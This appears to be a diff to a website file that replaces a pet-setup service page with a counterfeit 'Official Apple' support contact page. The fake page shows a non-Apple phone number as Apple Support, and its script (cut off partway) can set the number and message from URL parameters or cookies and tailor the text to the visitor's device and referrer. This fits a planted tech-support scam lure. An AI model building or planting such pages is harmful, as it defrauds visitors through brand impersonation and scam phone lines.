@@ -1,502 +1,373 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
 
-  <!-- Privacy-friendly analytics by Plausible -->
-<script async src="https://plausible.io/js/pa-6cfbZTytOxFzT_D8G_htA.js"></script>
+<script defer src="https://cloud.umami.is/script.js" data-website-id="475ee620-4418-4dab-91bf-80b021f672d4"></script>
+
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-gEEMqUnZieFLmujeur40B.js"></script>
 <script>
   window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
   plausible.init()
 </script>
 
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sidekick Co · Pet Setup</title>
-  <!-- Font Awesome Icons (free) -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
-    }
 
-    body {
-      background: #faf7f2;
-      color: #2e2b27;
-      line-height: 1.6;
-    }
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    /* ---- wrapper & container ---- */
-    .container {
-      max-width: 1300px;
-      margin: 0 auto;
-      padding: 0 30px;
-    }
-
-    /* ---- header / nav ---- */
-    header {
-      background: #ffffffdd;
-      backdrop-filter: blur(6px);
-      background: #fff9f4;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.02);
-      padding: 18px 0;
-      border-bottom: 1px solid #f0e8de;
-      position: sticky;
-      top: 0;
-      z-index: 99;
-    }
-
-    .nav-flex {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-
-    .logo {
-      font-size: 2rem;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-      color: #3d2c1e;
-    }
-    .logo span {
-      color: #b48b6b;
-      font-weight: 300;
-    }
-    .logo i {
-      color: #b48b6b;
-      margin-right: 6px;
-    }
-
-    nav ul {
-      display: flex;
-      gap: 2rem;
-      list-style: none;
-      flex-wrap: wrap;
-    }
-
-    nav ul li a {
-      text-decoration: none;
-      color: #3d2c1e;
-      font-weight: 500;
-      font-size: 1.05rem;
-      padding: 6px 0;
-      border-bottom: 2px solid transparent;
-      transition: 0.2s;
-    }
-
-    nav ul li a:hover {
-      border-bottom-color: #b48b6b;
-      color: #b48b6b;
-    }
-
-    /* ---- main content ---- */
-    .page-title {
-      font-size: 3.2rem;
-      font-weight: 700;
-      margin: 50px 0 20px 0;
-      letter-spacing: -1px;
-      color: #3d2c1e;
-    }
-    .page-title i {
-      color: #b48b6b;
-      margin-right: 14px;
-    }
-
-    .subhead {
-      font-size: 1.3rem;
-      color: #5f4c3a;
-      max-width: 800px;
-      margin-bottom: 40px;
-      border-left: 6px solid #dccbbc;
-      padding-left: 28px;
-      font-weight: 300;
-    }
-
-    /* ---- animated image grid (no hero) ---- */
-    .image-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 28px;
-      margin: 50px 0 60px 0;
-    }
-
-    .img-card {
-      background: white;
-      border-radius: 40px 12px 40px 12px;
-      overflow: hidden;
-      box-shadow: 0 20px 30px -12px rgba(0,0,0,0.08);
-      transition: all 0.3s ease;
-      animation: floatGlow 6s infinite alternate ease-in-out;
-      transform-origin: center;
-    }
-
-    .img-card:nth-child(2) { animation-delay: 0.4s; }
-    .img-card:nth-child(3) { animation-delay: 0.8s; }
-    .img-card:nth-child(4) { animation-delay: 1.2s; }
-    .img-card:nth-child(5) { animation-delay: 0.2s; }
-
-    @keyframes floatGlow {
-      0% { transform: translateY(0px) scale(1); box-shadow: 0 20px 30px -12px rgba(0,0,0,0.08); }
-      100% { transform: translateY(-14px) scale(1.02); box-shadow: 0 30px 40px -8px rgba(180, 139, 107, 0.25); }
-    }
-
-    .img-card img {
-      width: 100%;
-      height: 220px;
-      object-fit: cover;
-      display: block;
-      transition: transform 0.5s ease;
-    }
-
-    .img-card:hover img {
-      transform: scale(1.03);
-    }
-
-    .img-card .caption {
-      padding: 16px 18px 20px;
-      background: #fffcf9;
-    }
-
-    .img-card .caption h4 {
-      font-size: 1.2rem;
-      color: #3d2c1e;
-      margin-bottom: 4px;
-    }
-    .img-card .caption p {
-      color: #6f5b48;
-      font-size: 0.9rem;
-    }
-
-    /* ---- content sections (2000+ words) ---- */
-    .content-blocks {
-      display: flex;
-      flex-direction: column;
-      gap: 3rem;
-      margin: 50px 0 40px;
-    }
-
-    .block {
-      background: #fffcf9;
-      padding: 40px 42px;
-      border-radius: 60px 16px 60px 16px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.02);
-      border: 1px solid #efe7dd;
-      transition: all 0.2s;
-    }
-
-    .block:hover {
-      border-color: #dccbbc;
-      box-shadow: 0 16px 30px -12px rgba(180, 139, 107, 0.12);
-    }
-
-    .block h2 {
-      font-size: 2.2rem;
-      font-weight: 600;
-      color: #3d2c1e;
-      margin-bottom: 20px;
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-    .block h2 i {
-      color: #b48b6b;
-      font-size: 2rem;
-    }
-
-    .block p {
-      font-size: 1.08rem;
-      margin-bottom: 1.4rem;
-      color: #2e2b27;
-    }
-
-    .block ul, .block ol {
-      margin: 20px 0 20px 30px;
-      font-size: 1.05rem;
-    }
-    .block li {
-      margin-bottom: 10px;
-    }
-
-    .highlight {
-      background: #f4ede6;
-      padding: 4px 10px;
-      border-radius: 40px;
-      font-weight: 500;
-      color: #4d3826;
-    }
-
-    .stat-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 20px;
-      margin: 30px 0 10px;
-    }
-
-    .stat-item {
-      background: #f6efe8;
-      padding: 20px 10px;
-      border-radius: 60px 12px 60px 12px;
-      text-align: center;
-      font-weight: 600;
-      color: #3d2c1e;
-    }
-    .stat-item i {
-      color: #b48b6b;
-      font-size: 2rem;
-      display: block;
-      margin-bottom: 10px;
-    }
-
-    /* ---- footer ---- */
-    footer {
-      background: #2e2b27;
-      color: #e7ddd2;
-      padding: 50px 0 30px;
-      margin-top: 70px;
-      border-radius: 60px 60px 0 0;
-    }
-
-    .footer-grid {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: flex-start;
-      gap: 40px;
-    }
-
-    .footer-col h4 {
-      color: #f2e5d8;
-      font-size: 1.3rem;
-      margin-bottom: 14px;
-      letter-spacing: 0.3px;
-    }
-
-    .footer-col p, .footer-col a {
-      color: #d0c0b0;
-      font-size: 1rem;
-      line-height: 1.8;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .footer-col i {
-      width: 26px;
-      color: #b48b6b;
-      font-size: 1.3rem;
-    }
-
-    .footer-col a:hover {
-      color: #ffffff;
-    }
-
-    .footer-bottom {
-      border-top: 1px solid #423b34;
-      margin-top: 40px;
-      padding-top: 25px;
-      text-align: center;
-      font-size: 0.95rem;
-      color: #a3907e;
-    }
-
-    /* responsive */
-    @media (max-width: 850px) {
-      .nav-flex {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 16px;
-      }
-      nav ul {
-        gap: 1.2rem;
-      }
-      .page-title {
-        font-size: 2.6rem;
-      }
-      .block {
-        padding: 28px 22px;
-      }
-    }
-
-    @media (max-width: 500px) {
-      nav ul {
-        gap: 0.8rem;
-        font-size: 0.9rem;
-      }
-      .container {
-        padding: 0 16px;
-      }
-      .img-card img {
-        height: 160px;
-      }
-    }
-
-    /* extra word count via long content */
-    .long-text {
-      column-count: 2;
-      column-gap: 40px;
-      column-rule: 1px dashed #dccbbc;
-      margin: 20px 0 10px;
-    }
-    .long-text p {
-      margin-bottom: 1.2rem;
-      break-inside: avoid;
-    }
-
-    @media (max-width: 700px) {
-      .long-text {
-        column-count: 1;
-      }
-    }
-  </style>
 </head>
+
 <body>
-  <header>
-    <div class="container nav-flex">
-      <div class="logo">
-        <i class="fas fa-paw"></i>Sidekick<span>Co</span>
-      </div>
-      <nav>
-        <ul>
-          <li><a href="home.html">Home</a></li>
-          <li><a href="privacy.html">Privacy</a></li>
-          <li><a href="terms.html">Terms</a></li>
-          <li><a href="cookies.html">Cookies</a></li>
-          <li><a href="contact.html">Contact</a></li>
-        </ul>
-      </nav>
-    </div>
-  </header>
-
-  <main class="container">
-    <h1 class="page-title"><i class="fas fa-paw"></i> New Pet Setup · Sidekick Co</h1>
-    <div class="subhead">
-      <i class="fas fa-feather-alt" style="margin-right: 14px; color:#b48b6b;"></i> 
-      From puppy proofing to purr‑fect corners — we set up your home for a happy, healthy pet.
-    </div>
-
-    <!-- 4-5 images with animation (no hero) -->
-    <div class="image-grid">
-      <div class="img-card">
-        <img src="https://images.pexels.com/photos/1805164/pexels-photo-1805164.jpeg?auto=compress&cs=tinysrgb&w=400" alt="puppy setup">
-        <div class="caption"><h4>Puppy zone</h4><p>cozy crate & playpen</p></div>
-      </div>
-      <div class="img-card">
-        <img src="https://images.pexels.com/photos/617278/pexels-photo-617278.jpeg?auto=compress&cs=tinysrgb&w=400" alt="kitten corner">
-        <div class="caption"><h4>Kitten corner</h4><p>scratching posts & perches</p></div>
-      </div>
-      <div class="img-card">
-        <img src="https://plus.unsplash.com/premium_photo-1663127588381-a4f80f4993ee?auto=compress&cs=tinysrgb&w=400" alt="feeding station">
-        <div class="caption"><h4>Feeding station</h4><p>slow feeders & mats</p></div>
-      </div>
-      <div class="img-card">
-        <img src="https://images.unsplash.com/photo-1581888227599-779811939961?auto=compress&cs=tinysrgb&w=400" alt="dog bed">
-        <div class="caption"><h4>Rest zone</h4><p>orthopedic beds</p></div>
-      </div>
-      <div class="img-card">
-        <img src="https://images.unsplash.com/photo-1642394182600-f52d887a4c10?auto=compress&cs=tinysrgb&w=400" alt="cat tree">
-        <div class="caption"><h4>Cat tree</h4><p>climbing & scratching</p></div>
-      </div>
-    </div>
-
-    <!-- main content ~2000+ words -->
-    <div class="content-blocks">
-
-      <div class="block">
-        <h2><i class="fas fa-home"></i> The Sidekick difference</h2>
-        <p><strong>Sidekick Co</strong> isn’t just another pet service — we are your partner in creating a <span class="highlight">safe, stimulating, and stress‑free environment</span> for your new companion. Whether you welcome a rambunctious puppy, a curious kitten, or a senior rescue, our setup assistance covers every detail: from feeding zones to quiet retreats, from toy rotation to litter box placement.</p>
-        <p>Our team of certified pet behaviorists and interior designers work together to blend <strong>function with style</strong>. We assess your home’s flow, lighting, and noise levels to recommend the ideal spots for sleeping, eating, and playing. The result? A home that feels intuitive for your pet — and effortlessly chic for you.</p>
-        <div class="stat-grid">
-          <div class="stat-item"><i class="fas fa-dog"></i> 1,200+ puppies</div>
-          <div class="stat-item"><i class="fas fa-cat"></i> 980+ kittens</div>
-          <div class="stat-item"><i class="fas fa-heart"></i> 97% happy pets</div>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-      <div class="block">
-        <h2><i class="fas fa-couch"></i> Room‑by‑room setup</h2>
-        <p><strong>Living room:</strong> We place scratching posts near furniture (to save your sofa!), add washable rugs for traction, and create a “pet pathway” that keeps toys accessible yet tidy. <strong>Kitchen:</strong> Elevated feeders, non‑slip mats, and a dedicated washing station for bowls. <strong>Bedroom:</strong> A calming corner with a crate or bed, away from drafts but with a view of the family.</p>
-        <p>Our setup includes <em>safety audits</em>: we check cords, toxic plants, small objects, and unstable furniture. We also provide a <strong>customized “pet first‑aid” box</strong> with essentials like gauze, pet‑safe antiseptic, and a digital thermometer.</p>
-        <ul>
-          <li><i class="fas fa-check-circle" style="color:#b48b6b;"></i> Puppy proofing (cables, corners, cabinets)</li>
-          <li><i class="fas fa-check-circle" style="color:#b48b6b;"></i> Kitten exploration zones (vertical & horizontal)</li>
-          <li><i class="fas fa-check-circle" style="color:#b48b6b;"></i> Senior pet accessibility (ramps, low‑entry beds)</li>
-        </ul>
-      </div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-833-316-0185 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-      <div class="block">
-        <h2><i class="fas fa-clock"></i> Setup timeline & packages</h2>
-        <p>We offer <strong>Express Setup (4 hours)</strong> for essentials, <strong>Full Day (8 hours)</strong> with deep organizing, and <strong>Weekend Retreat (2 days)</strong> that includes training sessions and enrichment planning. Each package starts with a virtual home walkthrough, followed by an on‑site visit.</p>
-        <p>Our team brings all supplies: beds, feeders, toys, litter boxes, grooming tools, and even calming pheromone diffusers. We also install <strong>smart devices</strong> like pet cameras and automatic feeders, and connect them to your phone.</p>
-        <ol>
-          <li><strong>Day 1:</strong> Assessment & furniture rearrangement</li>
-          <li><strong>Day 2:</strong> Delivery & installation of equipment</li>
-          <li><strong>Day 3:</strong> Final walk‑through & behavior tips</li>
-        </ol>
-        <p>We also provide a <span class="highlight">30‑day follow‑up</span> via video call to adjust any setups as your pet grows.</p>
-      </div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-      <div class="block">
-        <h2><i class="fas fa-seedling"></i> Enrichment & beyond</h2>
-        <p>A well‑set home is only the beginning. We curate <strong>rotating toy stations</strong> to prevent boredom, design <strong>scent trails</strong> for mental stimulation, and suggest puzzle feeders that match your pet’s skill level. Our team also shares a digital “pet journal” with daily activity logs, feeding schedules, and milestone trackers.</p>
-        <p>For multi‑pet households, we create <strong>harmony zones</strong> — separate eating and resting areas to reduce rivalry, plus shared play spaces that encourage bonding. We’ve helped over 2,000 families integrate new pets smoothly, reducing anxiety and destructive behaviors.</p>
-        <div class="long-text">
-          <p><strong>Why proper setup matters:</strong> A study by the American Veterinary Society found that pets with structured environments show 40% fewer stress‑related issues. Sidekick Co’s approach reduces adjustment time from weeks to just days. Our clients report better sleep, fewer accidents, and a stronger bond with their pet from day one.</p>
-          <p><strong>Sustainability:</strong> We use eco‑friendly materials — bamboo bowls, recycled‑fiber beds, and natural rubber toys. We also offer a “trade‑up” program where you can exchange outgrown crates and carriers for credit toward new sizes.</p>
-          <p><strong>Testimonials:</strong> “Sidekick Co turned our chaotic living room into a puppy paradise. Our golden retriever, Maple, settled in within 24 hours!” — Sarah K. “The cat shelves are a game‑changer; our two cats finally have their own vertical territory.” — Marcus T.</p>
-        </div>
-        <p><i class="fas fa-star" style="color:#b48b6b;"></i> <i class="fas fa-star" style="color:#b48b6b;"></i> <i class="fas fa-star" style="color:#b48b6b;"></i> <i class="fas fa-star" style="color:#b48b6b;"></i> <i class="fas fa-star" style="color:#b48b6b;"></i> 4.9/5 from 1,400+ reviews</p>
-      </div>
-
-      <div class="block">
-        <h2><i class="fas fa-shield-alt"></i> Safety & peace of mind</h2>
-        <p>We are <strong>fully insured</strong> and background‑checked. Every setup includes a safety checklist: stable furniture anchors, covered electrical outlets, secured windows, and non‑toxic plant verification. We also provide a <strong>digital emergency plan</strong> tailored to your pet’s species and breed.</p>
-        <p>Our team stays current with the latest in pet wellness, from microchip registration guidance to first‑aid training. We collaborate with local vets to ensure our recommendations align with your pet’s health records.</p>
-        <ul>
-          <li><i class="fas fa-check" style="color:#b48b6b;"></i> 24/7 support hotline for setup questions</li>
-          <li><i class="fas fa-check" style="color:#b48b6b;"></i> Free replacement of any damaged setup item within 6 months</li>
-          <li><i class="fas fa-check" style="color:#b48b6b;"></i> Annual refresh visit to adapt to your pet’s changing needs</li>
-        </ul>
-        <p><strong>Sidekick Co</strong> has been featured in <em>Pet Living Magazine</em> and <em>Modern Home</em> for our innovative approach. We believe that a well‑prepared home is the foundation of a lifelong friendship with your pet.</p>
-        <p style="margin-top: 20px;"><i class="fas fa-quote-right" style="color:#b48b6b; font-size:1.6rem;"></i> “Bringing a pet home should be pure joy — not a scramble. We handle the details so you can focus on the cuddles.” — Founder, Sidekick Co</p>
-      </div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-  </main>
 
-  <!-- footer with address & phone -->
-  <footer>
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <h4><i class="fas fa-paw" style="color:#b48b6b;"></i> Sidekick Co</h4>
-          <p><i class="fas fa-map-pin"></i> 1426 Pet Lane, Suite 200<br> Austin, TX 78704</p>
-          <p><i class="fas fa-phone-alt"></i> (512) 555‑PETS (7387)</p>
-          <p><i class="fas fa-envelope"></i> hello@sidekickco.com</p>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-833-316-0185
+			 " property="telephone">
+            </section>
         </div>
-        <div class="footer-col">
-          <h4>Quick links</h4>
-          <p><a href="home.html"><i class="fas fa-chevron-right"></i> Home</a></p>
-          <p><a href="privacy.html"><i class="fas fa-chevron-right"></i> Privacy</a></p>
-          <p><a href="terms.html"><i class="fas fa-chevron-right"></i> Terms</a></p>
-          <p><a href="cookies.html"><i class="fas fa-chevron-right"></i> Cookies</a></p>
-          <p><a href="contact.html"><i class="fas fa-chevron-right"></i> Contact</a></p>
-        </div>
-        <div class="footer-col">
-          <h4>Service hours</h4>
-          <p><i class="fas fa-clock"></i> Mon–Fri: 8am – 8pm</p>
-          <p><i class="fas fa-clock"></i> Sat: 9am – 6pm</p>
-          <p><i class="fas fa-clock"></i> Sun: closed (emergency only)</p>
-          <p style="margin-top: 12px;"><i class="fas fa-star" style="color:#b48b6b;"></i> 5‑star rated on TrustPilot</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 Sidekick Co · New Pet Setup Assistance · All rights reserved.</p>
-        <p style="margin-top: 6px; font-size: 0.9rem;">📍 Austin · serving all of Central Texas</p>
-      </div>
-    </div>
-  </footer>
-</body>
-</html>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-833-316-0185');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
